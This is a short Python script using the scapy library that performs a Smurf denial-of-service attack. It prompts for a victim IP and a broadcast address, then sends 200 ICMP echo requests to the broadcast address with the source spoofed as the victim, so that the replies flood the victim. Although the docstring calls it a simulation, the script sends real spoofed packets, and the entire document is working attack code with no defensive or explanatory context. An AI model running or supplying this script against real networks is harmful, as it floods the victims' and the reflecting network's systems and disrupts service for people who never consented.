from scapy.all import IP, ICMP, send

def smurf_attack(target_ip, broadcast_ip, packet_count=200):
    """
    Simulate a Smurf attack by sending ICMP Echo Requests to a broadcast address
    with the source IP spoofed as the target IP.

    :param target_ip: The victim's IP address (spoofed source IP)
    :param broadcast_ip: The broadcast address of the network to flood
    :param packet_count: Number of packets to send
    """
    print(f"Starting Smurf attack simulation: spoofed source {target_ip} -> broadcast {broadcast_ip}")

    for i in range(packet_count):
        packet = IP(src=target_ip, dst=broadcast_ip) / ICMP()
        send(packet, verbose=False)
        print(f"Sent packet {i+1}/{packet_count}")

    print("Smurf attack simulation completed.")

if __name__ == "__main__":
    victim_ip = input("ENTER THE VICTIM_IP\n")      # Spoofed source IP (victim)
    broadcast_address = input("ENTER THE BROADCAST_ADDRESS\n")  # Network broadcast address

    smurf_attack(victim_ip, broadcast_address, packet_count=200)
